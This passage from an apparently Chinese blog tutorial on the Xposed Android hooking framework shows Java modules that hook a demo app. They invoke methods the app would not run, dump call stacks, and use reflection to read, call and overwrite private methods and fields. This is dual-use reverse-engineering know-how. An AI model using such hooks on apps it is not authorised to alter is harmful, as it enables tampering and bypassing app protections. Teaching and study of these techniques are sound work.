XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        Log.d(<span class="string">&quot;xiaojianbang&quot;</span>,<span class="string">&quot;qian&quot;</span>);</span><br><span class="line">                        XposedHelpers.callMethod(clazz.newInstance(),<span class="string">&quot;refl&quot;</span>);</span><br><span class="line">                        Log.d(<span class="string">&quot;xiaojianbang&quot;</span>,<span class="string">&quot;hou&quot;</span>);</span><br><span class="line">                        <span class="type">int</span> aa=XposedHelpers.getIntField(param.thisObject,<span class="string">&quot;innerPublicInt&quot;</span>);</span><br><span class="line">                        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;&quot;</span>+aa);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码是在“Hook内部类”基础上写的。主动调用就是调用一个app本身不会执行的方法，你主动让他执行。</p><p>说一下这个代码的变化之处。因为调用方法实例，肯定要有对象</p><ul><li>clazz.newInstance()：动态创建类的新对象</li><li>XposedHelpers.callMethod(Object obj, String methodName, Object… args):调用方法</li></ul><h3 id="执行结果-7"><a href="#执行结果-7" class="headerlink" title="执行结果"></a>执行结果</h3><p>运行demo<br><img src="2025-01-15-Xposed框架/image-20230715221315133.png" alt="image-20230715221315133"></p><h2 id="九-打印函数调用栈"><a href="#九-打印函数调用栈" class="headerlink" title="九.打印函数调用栈"></a>九.打印函数调用栈</h2><h3 id="目标：打印函数调用栈，参看谁调用了innerFunc方法"><a href="#目标：打印函数调用栈，参看谁调用了innerFunc方法" class="headerlink" title="目标：打印函数调用栈，参看谁调用了innerFunc方法"></a>目标：打印函数调用栈，参看谁调用了innerFunc方法</h3><h3 id="代码实现如下："><a href="#代码实现如下：" class="headerlink" title="代码实现如下："></a>代码实现如下：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        Log.e(<span class="string">&quot;xiaojianbang&quot;</span>,<span class="string">&quot;Stack:&quot;</span>,<span class="keyword">new</span> <span class="title class_">Throwable</span>(<span class="string">&quot;Stack dump&quot;</span>));</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印函数调用栈一般用Log.e，这里就是再findAndHookMethod方法”innerFunc”时查看调用栈，看谁调用了”innerFunc”方法</p><ul><li>new Throwable()：抛出错误，查看栈信息</li></ul><h3 id="执行结果-8"><a href="#执行结果-8" class="headerlink" title="执行结果"></a>执行结果</h3><p>运行demo<br><img src="2025-01-15-Xposed框架/image-20230716152534518.png" alt="image-20230716152534518"></p><p>test调用了”innerFunc”方法。</p><p><strong>方法二：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">PrintStack</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Dump Stack: &quot;</span>+ <span class="string">&quot;---------------start----------------&quot;</span>);</span><br><span class="line">        <span class="type">Throwable</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Throwable</span>();</span><br><span class="line">        StackTraceElement[] stackElements = ex.getStackTrace();</span><br><span class="line">        <span class="keyword">if</span> (stackElements != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; stackElements.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">                XposedBridge.log(<span class="string">&quot;Dump Stack&quot;</span>+i+<span class="string">&quot;: &quot;</span>+ stackElements[i].getClassName()</span><br><span class="line">                        +<span class="string">&quot;----&quot;</span>+stackElements[i].getFileName()</span><br><span class="line">                        +<span class="string">&quot;----&quot;</span> + stackElements[i].getLineNumber()</span><br><span class="line">                        +<span class="string">&quot;----&quot;</span> +stackElements[i].getMethodName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Dump Stack: &quot;</span>+ <span class="string">&quot;---------------over----------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">RuntimeException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;&lt;Start dump Stack !&gt;&quot;</span>);</span><br><span class="line">        e.fillInStackTrace();</span><br><span class="line">        Log.i(<span class="string">&quot;&lt;Dump Stack&gt;:&quot;</span>, <span class="string">&quot;++++++++++++&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="十-Java反射大法-获取方法"><a href="#十-Java反射大法-获取方法" class="headerlink" title="十.Java反射大法(获取方法)"></a>十.Java反射大法(获取方法)</h2><h3 id="目标：获得private方法"><a href="#目标：获得private方法" class="headerlink" title="目标：获得private方法"></a>目标：获得private方法<img src="2025-01-15-Xposed框架/image-20230716154434826.png" alt="image-20230716154434826"></h3><h3 id="代码实现如下-8"><a href="#代码实现如下-8" class="headerlink" title="代码实现如下"></a>代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                       Class democlazz=Class.forName(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,<span class="literal">false</span>,loadPackageParam.classLoader);</span><br><span class="line">                        Method  reflmethod=democlazz.getDeclaredMethod(<span class="string">&quot;refl&quot;</span>);</span><br><span class="line">                        reflmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        reflmethod.invoke(clazz.newInstance());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>步骤：</p><ol><li>找到类</li><li>找到字段或方法 设定访问权限</li><li>修改字段或调用方法</li></ol><ul><li>Class.forName(“包+类”,false,loadPackageParam.classLoader):加载refl方法所在的类。</li><li>getDeclaredMethod(“方法名”,”参数”):获取方法，getDeclaredMethod可以获取private方法，getMethod不可以获取private方法</li><li>setAccessible(true/false)：设置访问权限，private</li><li>invoke(Object obj, Object… args)：调用方法</li><li>xxx.getType()：获取字段类型</li><li>xxx.getName()：获取字段名字</li><li>xxx.getModifiers()：获取访问修饰符</li></ul><h3 id="执行结果："><a href="#执行结果：" class="headerlink" title="执行结果："></a>执行结果：</h3><p>运行demo<br><img src="2025-01-15-Xposed框架/image-20230716173137994.png" alt="image-20230716173137994"></p><h2 id="十一-反射大法-获取属性"><a href="#十一-反射大法-获取属性" class="headerlink" title="十一.反射大法(获取属性)"></a>十一.反射大法(获取属性)</h2><h3 id="目标：获得private字段并设置"><a href="#目标：获得private字段并设置" class="headerlink" title="目标：获得private字段并设置"></a>目标：获得private字段并设置<img src="2025-01-15-Xposed框架/image-20230716180947881.png" alt="image-20230716180947881"></h3><h3 id="代码实现如下-9"><a href="#代码实现如下-9" class="headerlink" title="代码实现如下"></a>代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                       Class democlazz=Class.forName(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,<span class="literal">false</span>,loadPackageParam.classLoader);</span><br><span class="line">                       Field reffield=democlazz.getDeclaredField(<span class="string">&quot;reflect&quot;</span>);</span><br><span class="line">                       Object obj=clazz.newInstance();</span><br><span class="line">                       reffield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                       String str=(String)reffield.get(obj);</span><br><span class="line">                       Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;这是反射获取的字段 &quot;</span>+ str);</span><br><span class="line">                       reffield.set(obj,<span class="string">&quot;fanshedafa&quot;</span>);</span><br><span class="line">                       str=(String)reffield.get(obj);</span><br><span class="line">                        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;这是反射设置的字段 &quot;</span>+ str);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>getDeclaredField(String name)：获取属性，和getField区别如上面的getDeclaredMethod一样。</li><li>setAccessible(true/false)：设置访问权限，private</li><li>get(Object obj)：获取obj对象的对应属性的值</li><li>set(Object obj，Object value)：设置obj对象的对应属性的值</li></ul><h3 id="执行结果-9"><a href="#执行结果-9" class="headerlink" title="执行结果"></a>执行结果</h3><p>运行demo<br><img src="2025-01-15-Xposed框架/image-20230716182556152.png" alt="image-20230716182556152"></p><p>确实值被改变</p><h2 id="十二-遍历所有方法和字段"><a href="#十二-遍历所有方法和字段" class="headerlink" title="十二.遍历所有方法和字段"></a>十二.遍历所有方法和字段</h2><h3 id="目标：遍历所有方法和字段"><a href="#目标：遍历所有方法和字段" class="headerlink" title="目标：遍历所有方法和字段"></a>目标：遍历所有方法和字段</h3><h3 id="代码实现如下-10"><a href="#代码实现如下-10" class="headerlink" title="代码实现如下"></a>代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        Method[] md=clazz.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;md.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,md[i].toString());</span><br><span class="line">        &#125;</span><br><span class="line">        Field[] fd=clazz.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;fd.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,fd[i].toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>getDeclaredMethods()：获得所有方法，返回值是Method[]</li><li>getDeclaredFields()：获得所有属性，返回值是Field[]</li></ul><h3 id="执行结果-10"><a href="#执行结果-10" class="headerlink" title="执行结果"></a>执行结果</h3><p>运行demo<br><img src="2025-01-15-Xposed框架/image-20230716190331913.png" alt="image-20230716190331913"></p><h2 id="十三-遍历所有内部类"><a href="#十三-遍历所有内部类" class="headerlink" title="十三.遍历所有内部类"></a>十三.遍历所有内部类</h2><h3 id="目标：遍历所有内部类"><a href="#目标：遍历所有内部类" class="headerlink" title="目标：遍历所有内部类"></a>目标：遍历所有内部类</h3><h3 id="代码实现如下-11"><a href="#代码实现如下-11" class="headerlink" title="代码实现如下"></a>代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        Method[] md=clazz.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;md.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,md[i].toString());</span><br><span class="line">        &#125;</span><br><span class="line">        Field[] fd=clazz.getDeclaredFields();</span><br><span class="line">        <span 